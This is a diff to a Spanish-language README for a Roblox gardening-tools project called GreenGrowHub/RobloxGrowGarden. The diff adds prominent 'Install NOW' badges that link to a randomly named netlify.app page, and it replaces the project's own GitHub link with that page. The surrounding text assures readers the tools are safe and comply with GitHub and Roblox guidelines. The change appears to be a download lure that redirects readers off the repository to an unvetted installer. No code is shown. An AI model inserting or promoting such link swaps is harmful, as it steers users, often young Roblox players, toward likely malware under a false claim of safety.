@@ -2,6 +2,9 @@
 
 ![Visitantes: 10K+](https://img.shields.io/badge/Visitantes-10K+-4CAF50) ![Actualizado: Septiembre 2025](https://img.shields.io/badge/Actualizado-Septiembre_2025-2196F3)  
 
+
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
+
 **🌿 ¡Bienvenidos a un Mundo de Crecimiento Floreciente!**  
 **GreenGrowHub** es un espacio comunitario de 2025 dedicado a proporcionar herramientas gratuitas para cultivar jardines vibrantes en Roblox Studio. 🌱 Nuestros recursos son seguros, de código abierto y cumplen con las directrices de GitHub y Roblox. ¡Únete a más de 10K visitantes para nutrir tus aventuras de jardinería! 🚀  
 
@@ -29,7 +32,9 @@ Inspirar a principiantes con recursos accesibles para construir simulaciones de 
 **🎉 ¡Crece Hoy!**  
 ¡Desata tu potencial con **RobloxGrowGarden**!  
 
-[![Descubre Ahora](https://img.shields.io/badge/Descubre-AHORA-9C27B0)](https://github.com/GreenGrowHub/RobloxGrowGarden)  
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
+
+
 
 ---
 
